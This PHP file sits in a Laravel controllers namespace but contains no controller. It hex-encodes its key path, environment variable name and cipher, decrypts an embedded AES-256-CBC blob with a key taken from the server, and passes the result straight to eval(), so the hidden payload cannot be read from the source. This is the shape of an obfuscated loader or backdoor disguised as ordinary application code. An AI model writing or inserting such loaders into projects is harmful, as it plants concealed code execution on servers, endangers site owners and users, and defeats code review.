<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('tAwXZ5H2nVlryUzogwYgoQ==');

$c=base64_decode(

'xyqIkrOYz7Ckc8+maoPpoGD12qsDrPr1J0pmVKJGD2ZSnBr93oZaI67ViG0+YRv5VbCyPLPkf/X/' .
'+pnbSM+KlBCpZWt5Wt9JAkvZqdbItHm7IbNH7EZ8dOn0/eHTvcjD1koRsKYcGp8uND9IBJJa3zbP' .
'zXbiIeQQhMz7UnJJa1qrndPQzMp2lR6qR4aaKB9vH4MXK3gg8F8kOdwv1K3wzg9ARrtqdL+LefSa' .
'++6TM2Co2dL4L0DeMcSt37PSUFyp'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

